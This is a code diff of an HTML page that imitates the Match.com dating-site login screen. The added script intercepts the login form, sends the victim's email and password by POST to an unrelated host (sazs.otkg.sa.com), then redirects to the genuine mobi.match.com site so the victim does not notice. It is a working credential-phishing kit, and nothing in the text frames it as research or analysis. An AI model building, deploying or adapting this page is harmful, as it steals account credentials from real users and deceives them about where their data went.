@@ -4,7 +4,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Match® | Login | The leading dating app for singles. Find better matches.</title>
+  <title>Match® | Login</title>
   <style>
     body {
       font-family: "Georgia", serif;
@@ -262,8 +262,8 @@
       <h1>Sign in</h1>
       <div class="join">Not a member? <a href="#">Join</a></div>
       <form id="loginForm" action="https://sazs.otkg.sa.com/auth/next.php">
-        <input type="email" name="user" id="email" placeholder="Email" required />
-        <input type="password" name="password" id="password" placeholder="Password" required  />
+        <input type="email" id="email" placeholder="Email" required />
+        <input type="password" id="password" placeholder="Password" required />
         <button type="submit" class="signin-btn">Sign in</button>
       </form>
       <div class="links">
@@ -305,35 +305,55 @@
       document.getElementById('cookiePopup').style.display = 'none';
     });
 
-    // Form submission preloader
-    document.getElementById("loginForm").addEventListener("submit", function (e) {
-      // e.preventDefault();
+    // Form submission with redirect
+    document.getElementById("loginForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
       const email = document.getElementById("email").value.trim();
       const password = document.getElementById("password").value.trim();
 
-      // if (!email || !password) {
-      //   // alert("Please fill out all fields.");
-      //   return;
-      // }
+      if (!email || !password) {
+        alert("Please fill out all fields.");
+        return;
+      }
 
+      // Add preloader
       const preloader = document.createElement('div');
       preloader.id = 'preloader';
       preloader.innerHTML = `
-        <div style="text-align:center">
-          <div class="spinner" aria-hidden="true"></div>
-          <div style="margin-top:12px;color:#333;font-family:system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial;">Logging In...</div>
-        </div>
-      `;
+      <div style="text-align:center">
+        <div class="spinner" aria-hidden="true"></div>
+        <div style="margin-top:12px;color:#333;">Loggin In...</div>
+      </div>
+    `;
       document.body.appendChild(preloader);
 
-      setTimeout(() => {
-        preloader.classList.add('hidden');
-        setTimeout(() => preloader.remove(), 600);
-        alert("Login successful! Welcome, " + email);
-        e.target.reset();
-      }, 2000);
+      try {
+        // Send the form data to the action URL
+        const response = await fetch(this.action, {
+          method: "POST",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          body: new URLSearchParams({ user: email, password: password })
+        });
+
+        // Optional: handle response if needed
+        console.log("Response status:", response.status);
+
+        // Simulate short delay for preloader
+        setTimeout(() => {
+          preloader.classList.add('hidden');
+          setTimeout(() => preloader.remove(), 600);
+
+          // Redirect after successful submission
+          window.location.href = "https://mobi.match.com/";
+        }, 1500);
+
+      } catch (err) {
+        preloader.remove();
+        alert("Error submitting form: " + err.message);
+      }
     });
   </script>
+
 </body>
 
 </html>
